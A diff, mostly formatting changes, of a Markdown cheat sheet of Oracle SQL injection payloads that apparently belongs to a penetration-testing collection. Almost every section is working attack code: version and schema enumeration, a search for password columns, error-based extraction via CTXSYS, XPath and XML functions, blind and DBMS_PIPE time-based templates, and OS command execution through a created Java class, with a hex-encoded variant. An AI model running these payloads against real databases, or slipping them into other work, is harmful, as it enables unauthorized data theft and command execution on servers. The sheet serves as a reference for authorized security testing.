@@ -1,11 +1,13 @@
 # Oracle SQL Injection
 
 ## Oracle SQL version
+
 ```sql
 SELECT user FROM dual UNION SELECT * FROM v$version
 ```
 
 ## Oracle SQL database name
+
 ```sql
 SELECT global_name FROM global_name;
 SELECT name FROM V$DATABASE;
@@ -14,17 +16,20 @@ SELECT SYS.DATABASE_NAME FROM DUAL;
 ```
 
 ## Oracle SQL List Databases
+
 ```sql
 SELECT DISTINCT owner FROM all_tables;
 ```
 
 ## Oracle SQL List Column
+
 ```sql
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
 ```
 
 ## Oracle SQL List Tables
+
 ```sql
 SELECT table_name FROM all_tables;
 SELECT owner, table_name FROM all_tables;
@@ -39,8 +44,7 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | CTXSYS.DRITHSX.SN     | SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual |
 | Invalid XPath         | SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual |
 | Invalid XML           | SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual |
-| Invalid XML	          | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
-
+| Invalid XML           | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
 
 ## Oracle SQL Blind
 
@@ -53,11 +57,13 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | First letter of first message is t | SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
 
 ## Oracle SQL Time based
+
 ```sql
 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
 ```
 
 ## Oracle SQL Command execution
+
 ```sql
 /* create Java class */
 BEGIN
@@ -73,6 +79,7 @@ END;
 /* run OS command */
 SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 ```
+
 or (hex encoded)
 
 ```sql
@@ -85,4 +92,5 @@ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 ```
 
 ## Thanks to
- * [Heavily taken inspired by - NetSpi SQL Wiki ](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+
+* [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
